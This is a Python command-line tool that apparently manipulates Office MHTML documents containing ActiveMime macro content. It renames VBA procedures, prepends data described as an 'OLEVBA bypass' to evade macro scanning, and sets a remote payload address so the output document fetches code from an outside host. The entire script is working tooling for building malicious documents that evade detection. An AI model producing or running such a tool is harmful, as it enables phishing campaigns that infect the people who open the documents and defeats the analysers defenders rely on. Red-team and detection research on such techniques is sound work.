#!/usr/bin/env python3

from argparse import ArgumentParser
import email
from base64 import b64decode
from pathlib import Path
from urllib.parse import urlparse, unquote
from string import ascii_letters
from random import choice
from ActiveMimeMangler import ActiveMimeMangler

parser = ArgumentParser()

parser.add_argument('--infile', required=True, help='Input .mht file')
parser.add_argument('--outfile', required=True, help='Resulting manipulated file with embedded payload')

mangling_args = parser.add_argument_group()
mangling_args.add_argument('--inprocedure', required=False, help='Procedure name to be manipulated')
mangling_args.add_argument('--outprocedure', required=False, help='Resulting procedure name')

parser.add_argument('--remote', required=False, help='Address for remote payload')

misc_args = parser.add_mutually_exclusive_group(required=False)
misc_args.add_argument('--prependfile', help='File to prepend before MHTML contents')
misc_args.add_argument('--prependrandom', action='store_true', help='Prepend random bytes and OLEVBA bypass')

args = parser.parse_args()

if bool(args.inprocedure) ^ bool(args.outprocedure):
    parser.error("Either provide both --inprocedure and --outprocedure or none of them")

raw_activemime = None
with open(args.infile, 'rb') as infile:
    mhtml = email.message_from_binary_file(infile)
    for part in mhtml.walk():
        if "x-mso" in part.get_content_subtype():
            print("[+] Found ActiveMime content")
            raw_activemime = b64decode(part.get_payload())
            break

if not raw_activemime:
    print("[-] No ActiveMime content found")
    exit()

mangler = ActiveMimeMangler(raw_activemime)

if args.inprocedure and args.outprocedure:
    mangler.rename_procedure_link(args.inprocedure, args.outprocedure)
    print(f'[+] Renamed procedure {args.inprocedure} to {args.outprocedure}')

if args.prependfile:
    prepend_data = open(args.prependfile, 'rb').read().strip()
    mangler.set_prepended_data(prepend_data)
    print(f'[+] Prepended {len(prepend_data)} bytes from {args.prependfile}')

if args.prependrandom:
    prepend_data = mangler.generate_random_prepended_data()
    mangler.set_prepended_data(prepend_data)
    print(f'[+] Prepended {len(prepend_data)} bytes with OLEVBA bypass')

if args.remote:
    mangler.set_remote_payload(args.remote)
    print(f'[+] Set the address of the payload to {args.remote}')

    payload_filename = Path(unquote(urlparse(args.remote).path)).name
    if not payload_filename:
        print("[!] Could not find a name of remote file, will generate random one")
        payload_filename = ''.join(choice(ascii_letters) for i in range(8))

    mangler.save_payload(payload_filename)
    print(f'[+] Saved remote payload file to {payload_filename}')

mangler.save_document(args.outfile)

print(f'[+] Saved manipulated document to {args.outfile}')